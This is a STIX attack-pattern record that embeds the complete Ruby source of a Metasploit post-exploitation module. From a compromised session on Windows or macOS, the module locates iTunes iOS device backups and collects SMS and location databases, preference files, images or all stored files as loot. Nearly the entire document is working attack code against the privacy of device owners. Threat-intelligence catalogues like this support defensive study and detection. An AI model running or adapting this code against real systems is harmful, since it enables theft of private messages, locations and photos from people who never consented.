{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da6f09af-a214-4139-a6e8-1d5b81813067",
    "created": "2024-08-14T16:33:19.163086Z",
    "modified": "2024-08-14T16:33:19.163089Z",
    "name": "Windows Gather Apple iOS MobileSync Backup File Collection",
    "description": "This module will collect sensitive files from any on-disk iOS device backups 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/apple_ios_backup.rb",
            "external_id": "apple_ios_backup.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Version\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Apple iOS MobileSync Backup File Collection',\n        'Description' => %q{ This module will collect sensitive files from any on-disk iOS device backups },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'hdm',\n          'bannedit' # Based on bannedit's pidgin_cred module structure\n        ],\n        'Platform' => %w[osx win],\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('DATABASES', [false, 'Collect all database files? (SMS, Location, etc)', true]),\n        OptBool.new('PLISTS', [false, 'Collect all preference list files?', true]),\n        OptBool.new('IMAGES', [false, 'Collect all image files?', false]),\n        OptBool.new('EVERYTHING', [false, 'Collect all stored files? (SLOW)', false])\n      ]\n    )\n  end\n\n  #\n  # Even though iTunes is only Windows and Mac OS X, look for the MobileSync files on all platforms\n  #\n  #\n  def run\n    case session.platform\n    when 'osx'\n      @platform = :osx\n      paths = enum_users_unix\n    when 'windows'\n      @platform = :windows\n      drive = session.sys.config.getenv('SystemDrive')\n      version = get_version_info\n\n      if version.build_number >= Msf::WindowsVersion::Vista_SP0\n        @appdata = '\\\\AppData\\\\Roaming'\n        @users = drive + '\\\\Users'\n      else\n        @appdata = '\\\\Application Data'\n        @users = drive + '\\\\Documents and Settings'\n      end\n\n      if session.type != 'meterpreter'\n        print_error 'Only meterpreter sessions are supported on windows hosts'\n        return\n      end\n      paths = enum_users_windows\n    else\n      print_error \"Unsupported platform #{session.platform}\"\n      return\n    end\n\n    if paths.empty?\n      print_status('No users found with an iTunes backup directory')\n      return\n    end\n\n    process_backups(paths)\n  end\n\n  def enum_users_unix\n    if @platform == :osx\n      home = '/Users/'\n    else\n      home = '/home/'\n    end\n\n    if got_root?\n      userdirs = []\n      session.shell_command(\"ls #{home}\").gsub(/\\s/, \"\\n\").split(\"\\n\").each do |user_name|\n        userdirs << home + user_name\n      end\n      userdirs << '/root'\n    else\n      userdirs = [ home + whoami ]\n    end\n\n    backup_paths = []\n    userdirs.each do |user_dir|\n      output = session.shell_command(\"ls #{user_dir}/Library/Application\\\\ Support/MobileSync/Backup/\")\n      if output =~ /No such file/i\n        next\n      else\n        print_status(\"Found backup directory in: #{user_dir}\")\n        backup_paths << \"#{user_dir}/Library/Application\\\\ Support/MobileSync/Backup/\"\n      end\n    end\n\n    check_for_backups_unix(backup_paths)\n  end\n\n  def check_for_backups_unix(backup_dirs)\n    dirs = []\n    backup_dirs.each do |backup_dir|\n      print_status(\"Checking for backups in #{backup_dir}\")\n      session.shell_command(\"ls #{backup_dir}\").each_line do |dir|\n        next if dir == '.' || dir == '..'\n\n        if dir =~ /^[0-9a-f]{16}/i\n          print_status(\"Found #{backup_dir}\\\\#{dir}\")\n          dirs << ::File.join(backup_dir.chomp, dir.chomp)\n        end\n      end\n    end\n    dirs\n  end\n\n  def enum_users_windows\n    paths = Array.new\n\n    if got_root?\n      begin\n        session.fs.dir.foreach(@users) do |path|\n          next if path =~ /^(\\.|\\.\\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i\n\n          bdir = \"#{@users}\\\\#{path}#{@appdata}\\\\Apple Computer\\\\MobileSync\\\\Backup\"\n          dirs = check_for_backups_win(bdir)\n          dirs.each { |dir| paths << dir } if dirs\n        end\n      rescue ::Rex::Post::Meterpreter::RequestError\n        # Handle the case of the @users base directory is not accessible\n      end\n    else\n      print_status \"Only checking #{whoami} account since we do not have SYSTEM...\"\n      path = \"#{@users}\\\\#{whoami}#{@appdata}\\\\Apple Computer\\\\MobileSync\\\\Backup\"\n      dirs = check_for_backups_win(path)\n      dirs.each { |dir| paths << dir } if dirs\n    end\n    return paths\n  end\n\n  def check_for_backups_win(bdir)\n    dirs = []\n    begin\n      print_status(\"Checking for backups in #{bdir}\")\n      session.fs.dir.foreach(bdir) do |dir|\n        if dir =~ /^[0-9a-f]{16}/i\n          print_status(\"Found #{bdir}\\\\#{dir}\")\n          dirs << \"#{bdir}\\\\#{dir}\"\n        end\n      end\n    rescue Rex::Post::Meterpreter::RequestError\n      # Handle base directories that do not exist\n    end\n    dirs\n  end\n\n  def process_backups(paths)\n    paths.each { |path| process_backup(path) }\n  end\n\n  def process_backup(path)\n    print_status(\"Pulling data from #{path}...\")\n\n    mbdb_data = ''\n    mbdx_data = ''\n\n    print_status(\"Reading Manifest.mbdb from #{path}...\")\n    if session.type == 'shell'\n      mbdb_data = session.shell_command(\"cat #{path}/Manifest.mbdb\")\n      if mbdb_data =~ /No such file/i\n        print_status(\"Manifest.mbdb not found in #{path}...\")\n        return\n      end\n    else\n      mfd = session.fs.file.new(\"#{path}\\\\Manifest.mbdb\", 'rb')\n      mbdb_data << mfd.read until mfd.eof?\n      mfd.close\n    end\n\n    print_status(\"Reading Manifest.mbdx from #{path}...\")\n    if session.type == 'shell'\n      mbdx_data = session.shell_command(\"cat #{path}/Manifest.mbdx\")\n      if mbdx_data =~ /No such file/i\n        print_status(\"Manifest.mbdx not found in #{path}...\")\n        return\n      end\n    else\n      mfd = session.fs.file.new(\"#{path}\\\\Manifest.mbdx\", 'rb')\n      mbdx_data << mfd.read until mfd.eof?\n      mfd.close\n    end\n\n    manifest = Rex::Parser::AppleBackupManifestDB.new(mbdb_data, mbdx_data)\n\n    patterns = []\n    patterns << /\\.db$/i if datastore['DATABASES']\n    patterns << /\\.plist$/i if datastore['PLISTS']\n    patterns << /\\.(jpeg|jpg|png|bmp|tiff|gif)$/i if datastore['IMAGES']\n    patterns << /.*/ if datastore['EVERYTHING']\n\n    done = {}\n    patterns.each do |pat|\n      manifest.entries.each_pair do |fname, info|\n        next if done[fname]\n        next if info[:filename].to_s !~ pat\n\n        print_status(\"Downloading #{info[:domain]} #{info[:filename]}...\")\n\n        begin\n          fdata = ''\n          if session.type == 'shell'\n            fdata = session.shell_command(\"cat #{path}/#{fname}\")\n          else\n            mfd = session.fs.file.new(\"#{path}\\\\#{fname}\", 'rb')\n            fdata << mfd.read until mfd.eof?\n            mfd.close\n          end\n          bname = info[:filename] || 'unknown.bin'\n          rname = info[:domain].to_s + '_' + bname\n          rname = rname.gsub(%r{/|\\\\}, '.').gsub(/\\s+/, '_').gsub(/[^A-Za-z0-9._]/, '').gsub(/_+/, '_')\n          ctype = 'application/octet-stream'\n\n          store_loot('ios.backup.data', ctype, session, fdata, rname, \"iOS Backup: #{rname}\")\n        rescue ::Interrupt\n          raise $ERROR_INFO\n        rescue ::Exception => e\n          print_error(\"Failed to download #{fname}: #{e.class} #{e}\")\n        end\n\n        done[fname] = true\n      end\n    end\n  end\n\n  def got_root?\n    case @platform\n    when :windows\n      if session.sys.config.getuid =~ /SYSTEM/\n        return true\n      else\n        return false\n      end\n    else # unix, bsd, linux, osx\n      ret = whoami\n      if ret =~ /root/\n        return true\n      else\n        return false\n      end\n    end\n  end\n\n  def whoami\n    if @platform == :windows\n      session.sys.config.getenv('USERNAME')\n    else\n      session.shell_command('whoami').chomp\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[osx win]"
    ]
}